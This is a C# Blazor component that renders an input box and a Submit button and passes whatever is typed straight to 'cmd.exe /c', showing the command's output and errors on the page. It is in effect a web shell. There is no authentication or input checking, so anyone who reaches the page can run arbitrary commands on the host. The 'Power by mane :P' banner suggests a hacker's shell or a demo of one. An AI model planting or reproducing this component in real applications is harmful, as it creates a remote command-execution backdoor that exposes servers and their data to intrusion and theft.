using Microsoft.AspNetCore.Components;
using Microsoft.AspNetCore.Components.Rendering;
using Microsoft.AspNetCore.Components.Web;
using System.Diagnostics;

namespace BlazorApp3.Shared
{
    public class Component: ComponentBase
    {
        public string InputValue { get; set; } = "";
        public string result { get; set; } = "No Result";
        protected override void BuildRenderTree(RenderTreeBuilder builder)
        {
            // build header
            builder.OpenElement(0, "div");
            builder.AddMarkupContent(1, "<h1>Power by mane :P </h1>");
            builder.CloseElement();

            // build input
            builder.OpenElement(2, "input");
            builder.AddAttribute(3, "value", Microsoft.AspNetCore.Components.BindConverter.FormatValue(InputValue));
            builder.AddAttribute(4, "oninput", Microsoft.AspNetCore.Components.EventCallback.Factory.CreateBinder(this, __value => InputValue = __value, InputValue));
            builder.CloseElement();

            // build button
            builder.OpenElement(5, "button");
            builder.AddAttribute(6, "onclick", EventCallback.Factory.Create(this, ButtonClickAsync));
            builder.AddContent(7, "Submit");
            builder.CloseElement();

            // build output
            builder.OpenElement(8, "pre");
            builder.AddContent(9, result);
            builder.CloseElement();

            // build render tree
            base.BuildRenderTree(builder);
        }

        private void ButtonClickAsync()
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + InputValue;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();
            Console.WriteLine(output);
            string err = process.StandardError.ReadToEnd();
            Console.WriteLine(err);

            result = output + "\n" + err;

            StateHasChanged();
        }
    }
}